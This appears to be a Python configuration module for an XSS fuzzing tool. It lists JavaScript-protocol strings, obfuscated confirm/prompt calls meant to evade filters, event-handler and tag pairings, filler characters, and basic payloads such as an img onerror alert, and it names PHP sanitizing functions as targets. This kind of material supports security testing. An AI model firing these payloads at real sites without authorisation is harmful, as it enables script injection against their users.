from mimetypes import suffix_map
import hashlib
import time

unique_probe = hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()

feedback_log = './feedback/preg_replace.log'

feedback_dir = '/tmp/feedback'

xt_file = ""

protocols = (
    'javascript','javascript&#x3a'
)
functions = (
    'confirm(711)','top["con"+"firm"](711)',
    '(confirm)`711`', 'co\u006efir\u006d(711)',
    'a=prompt;a(711)','[711].find(confirm)',
)
eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a', 'input'],
    'onmouseover': ['a', 'html', 'd3v', 'input'],
}
fuzz_cases = [
    None,
    True,
    False,
    42,
    -42,
    3.14159, 
    "simple string", 
    "",  
    "a" * 10000, 
    [], 
    [1, 2, 3], 
    {}, 
    {"key": "value"}, 
    [{"nested": "array"}],
    {"nested": {"key": "value"}}, 
    [None, True, 42, "string", {}, []], 
    b"\x00\x01\x02",
    "<script>alert('XSS')</script>", 
]

protocolsAttributes = {
    'href': ['a', 'link'],
    'src': ['img', 'script', 'iframe', 'audio', 'video', 'embed']
}

required_attributes = {
    'a': ['href'],
    'img': ['src'],
    'input': ['type'],
    'script': ['src'],
    'link': ['href', 'rel'],
    'form': ['action', 'method'],
    'meta': ['name', 'content'],
    'iframe': ['src'],
    'audio': ['src'],
    'video': ['src']
}

target_functions = ["strip_tags", "htmlspecialchars", "filter_var", "str_replace", "htmlentities", "filter_input"]

self_closing = ("img", "input", "br", "hr", "meta", "link")

greaterfilling = '>'
lessfilling = '<'

script_starttag = '<script>'
script_endtag = '</script>'
suffix = '//\\'
payloads = (
    '<script>alert(1)</script>', '<a href=javascript:alert(1)>', '<img src=# onerror=alert(1)>'
)

fillings = ( ' ','%09', '%0a', '%0d', '/+/') 
jfillings = ';'

terminators = ('"', "'")
protocols_tags = (
    'a', 'link'
)
protocols_attributes =(
    'href', 'src'
)